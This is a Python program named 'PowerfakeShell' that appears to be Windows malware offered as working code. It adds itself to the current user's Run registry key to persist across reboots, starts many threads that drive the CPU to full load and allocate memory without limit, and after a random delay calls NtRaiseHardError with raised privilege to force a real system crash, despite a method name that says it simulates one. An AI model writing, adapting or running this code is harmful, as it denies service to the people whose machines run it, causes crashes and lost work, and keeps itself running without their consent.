import os
import sys
import ctypes
import threading
import time
import random
import struct
import winreg
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
import base64

class PowerfakeShell:
    def __init__(self):
        self.mutex = threading.Lock()
        self.resource_threads = []
        self.obfuscation_key = b'key-12345'
        
    def obfuscate(self, data):
        cipher = AES.new(self.obfuscation_key, AES.MODE_ECB)
        return base64.b64encode(cipher.encrypt(pad(data, AES.block_size)))
    
    def persist(self):
        try:
            exe_path = sys.argv[0]
            if not exe_path.endswith('.py'):
                exe_path = sys.executable
                
            reg_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
            with winreg.OpenKey(winreg.HKEY_CURRENT_USER, reg_path, 0, winreg.KEY_WRITE) as key:
                winreg.SetValueEx(key, "PowerfakeShell", 0, winreg.REG_SZ, exe_path)
        except:
            pass
    
    def memory_exhaustion(self):
        memory_blocks = []
        try:
            while True:
                block = bytearray(100 * 1024 * 1024)
                memory_blocks.append(block)
                time.sleep(0.1)
        except:
            pass
    
    def cpu_exhaustion(self):
        while True:
            start_time = time.time()
            while time.time() - start_time < 5:
                pass
            time.sleep(0.1)
    
    def trigger_instability(self):
        for _ in range(os.cpu_count() * 4):
            thread = threading.Thread(target=self.cpu_exhaustion)
            thread.daemon = True
            thread.start()
            self.resource_threads.append(thread)
        
        for _ in range(10):
            thread = threading.Thread(target=self.memory_exhaustion)
            thread.daemon = True
            thread.start()
            self.resource_threads.append(thread)
    
    def simulate_bsod(self):
        time.sleep(random.randint(30, 120))
        try:
            ntdll = ctypes.WinDLL('ntdll.dll')
            prev_value = ctypes.c_int()
            ntdll.RtlAdjustPrivilege(19, 1, 0, ctypes.byref(prev_value))
            ntdll.NtRaiseHardError(0xDEADDEAD, 0, 0, 0, 6, ctypes.byref(ctypes.c_ulong()))
        except:
            os._exit(1)
    
    def execute(self):
        if len(sys.argv) > 1 and sys.argv[1] == '--persist':
            self.persist()
        
        bsod_thread = threading.Thread(target=self.simulate_bsod)
        bsod_thread.daemon = True
        bsod_thread.start()
        
        self.trigger_instability()
        
        while True:
            time.sleep(60)

if __name__ == '__main__':
    core = PowerfakeShell()
    core.execute()